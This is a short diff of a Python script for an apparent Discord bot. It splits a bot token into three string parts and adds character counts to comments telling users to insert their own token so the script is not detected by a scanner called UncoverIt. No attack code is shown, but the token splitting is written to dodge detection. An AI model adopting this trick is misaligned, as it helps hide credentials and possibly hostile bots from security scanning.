@@ -568,9 +568,9 @@ async def send_to_discord(channel_id, message):
 
 # Bot configuration
 # Token split into multiple parts
-a1 = 'MTM2ODU5MDQxMDDD' #examples CHANGE THIS TO YOUR TOKEN TO NOT GET DETECTED BY UNCOVERIT
-a2 = 'MDA3NjEwMg.Gnb_DD' #examples CHANGE THIS TO YOUR TOKEN TO NOT GET DETECTED BY UNCOVERIT
-a3 = '.aqv-_fNc-Nj1PU4cikXsKQ_QMdCGCTNEKmDDDD' #examples CHANGE THIS TO YOUR TOKEN TO NOT GET DETECTED BY UNCOVERIT
+a1 = 'MTM2ODU5MDQxMDDD' #examples CHANGE THIS TO YOUR TOKEN TO NOT GET DETECTED BY UNCOVERIT 19 characters
+a2 = 'MDA3NjEwMg.Gnb_DD' #examples CHANGE THIS TO YOUR TOKEN TO NOT GET DETECTED BY UNCOVERIT 16 characters
+a3 = '.aqv-_fNc-Nj1PU4cikXsKQ_QMdCGCTNEKmDDDD' #examples CHANGE THIS TO YOUR TOKEN TO NOT GET DETECTED BY UNCOVERIT 40 characters
 
 # Function to reconstruct the token when needed
 def get_token():
